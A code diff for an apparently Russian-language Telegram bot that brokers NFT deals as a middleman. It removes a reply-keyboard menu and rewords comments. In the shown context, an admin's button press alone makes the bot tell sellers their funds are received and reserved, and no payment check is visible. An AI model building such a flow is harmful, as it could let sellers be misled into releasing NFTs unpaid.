@@ -24,13 +24,6 @@ class CreateDeal(StatesGroup):
     amount = State()
     nft_link = State()
 
-# --- МЕНЮ (НИЖНЯЯ КЛАВИАТУРА) ---
-def main_menu():
-    kb = [
-        [KeyboardButton(text="🤝 Создать сделку")]
-    ]
-    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
-
 # --- СТАРТ (С КАРТИНКОЙ, ТЕКСТОМ И ИНЛАЙН-КНОПКОЙ) ---
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
@@ -46,7 +39,7 @@ async def cmd_start(message: Message):
         "👇 Выберите нужный раздел ниже:"
     )
     
-    # Инлайн-кнопка прямо под сообщением
+    # Инлайн-кнопка, которая крепится прямо к сообщению
     inline_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🤝 Создать сделку", callback_data="start_create_deal")]
     ])
@@ -58,15 +51,14 @@ async def cmd_start(message: Message):
         reply_markup=inline_kb
     )
 
-# --- ОБРАБОТКА НАЖАТИЯ НА ИНЛАЙН-КНОПКУ "СОЗДАТЬ СДЕЛКУ" ---
+# --- ОБРАБОТКА ИНЛАЙН-КНОПКИ "СОЗДАТЬ СДЕЛКУ" ---
 @dp.callback_query(F.data == "start_create_deal")
 async def start_from_inline(call: CallbackQuery, state: FSMContext):
-    await call.message.delete() # Удаляем старое сообщение с картинкой
-    await create_deal_start(call.message, state) # Запускаем процесс создания
+    await call.message.delete() # Убираем сообщение с картинкой
+    await create_deal_start(call.message, state)
     await call.answer()
 
-# --- 1. СОЗДАНИЕ СДЕЛКИ (ЗАПУСК) ---
-@dp.message(F.text == "🤝 Создать сделку")
+# --- 1. СОЗДАНИЕ СДЕЛКИ ---
 async def create_deal_start(message: Message, state: FSMContext):
     await state.set_state(CreateDeal.bank_name)
     
@@ -155,7 +147,6 @@ async def process_nft(message: Message, state: FSMContext):
         parse_mode="HTML"
     )
     
-    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
     ])
@@ -173,7 +164,7 @@ async def process_nft(message: Message, state: FSMContext):
         reply_markup=admin_kb
     )
 
-# --- 2. ПОКУПАТЕЛЬ ОТКРЫВАЕТ СДЕЛКУ ПО ССЫЛКЕ ---
+# --- 2. ПОКУПАТЕЛЬ ОТКРЫВАЕТ СДЕЛКУ ---
 @dp.message(Command("start"), F.text.contains("deal_"))
 async def start_deal_by_link(message: Message):
     try:
@@ -250,7 +241,6 @@ async def admin_confirm(call: CallbackQuery):
     deal["status"] = "paid"
     await call.message.edit_text(f"✅ Вы подтвердили оплату по сделке с @{deal['seller_name']}.")
     
-    # ТЕКСТ ДЛЯ ПРОДАВЦА
     seller_text = (
         f"✅ <b>Средства по сделке получены и зарезервированы!</b>\n\n"
         f"📄 <b>Детали:</b>\n"
@@ -295,7 +285,6 @@ async def seller_done(call: CallbackQuery):
         parse_mode="HTML"
     )
     
-    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить передачу NFT", callback_data=f"admin_confirm_nft_{deal_id}")]
     ])
